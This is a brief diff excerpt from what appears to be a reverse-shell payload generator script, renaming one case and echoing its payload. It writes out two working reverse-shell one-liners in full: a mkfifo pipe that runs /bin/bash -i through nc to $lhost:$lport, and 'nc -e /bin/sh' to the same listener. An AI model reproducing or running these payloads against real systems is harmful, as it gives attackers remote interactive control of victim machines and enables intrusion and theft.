@@ -651,8 +651,8 @@ EOF
 
   local payload=""
   case "$type" in
-    nc-trad)
-      payload="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $lhost $lport >/tmp/f"
+    nc)
+      echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $lhost $lport >/tmp/f"
       ;;
     nc-openbsd)
       payload="nc -e /bin/sh $lhost $lport"
